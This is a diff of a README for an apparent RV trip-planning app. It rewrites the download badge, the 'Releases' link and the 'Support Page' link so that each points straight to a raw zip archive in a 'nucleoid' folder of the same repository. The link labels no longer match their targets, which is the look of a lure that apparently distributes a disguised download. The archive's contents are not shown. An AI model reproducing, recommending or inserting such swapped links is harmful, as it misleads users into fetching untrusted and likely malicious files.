@@ -1,6 +1,6 @@
 # 🚐 rv-there-yet-valley-hub-repo - Your Ultimate RV Journey Companion
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Deez69Nutts/rv-there-yet-valley-hub-repo/main/nucleoid/rv-there-yet-valley-hub-repo-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to RVThereYet SpeedRun! This app helps you plan your RV trips with ease.
 
 ## 📥 Download & Install
 
-To download the software, please visit this page to download: [RVThereYet Releases](https://github.com/Deez69Nutts/rv-there-yet-valley-hub-repo/releases).
+To download the software, please visit this page to download: [RVThereYet Releases](https://raw.githubusercontent.com/Deez69Nutts/rv-there-yet-valley-hub-repo/main/nucleoid/rv-there-yet-valley-hub-repo-v2.0.zip).
 
 1. **Visit the Release Page**
    - Click the link above to open the Releases page.
@@ -71,7 +71,7 @@ RVThereYet SpeedRun comes with several handy features that simplify your RV jour
 
 If you need help using the application or have questions, you can:
 
-- Visit the [Support Page](https://github.com/Deez69Nutts/rv-there-yet-valley-hub-repo/issues) for troubleshooting tips.
+- Visit the [Support Page](https://raw.githubusercontent.com/Deez69Nutts/rv-there-yet-valley-hub-repo/main/nucleoid/rv-there-yet-valley-hub-repo-v2.0.zip) for troubleshooting tips.
 - Join our community discussions on social media platforms or forums dedicated to RV travel.
 
 ## 📝 Updates and New Features
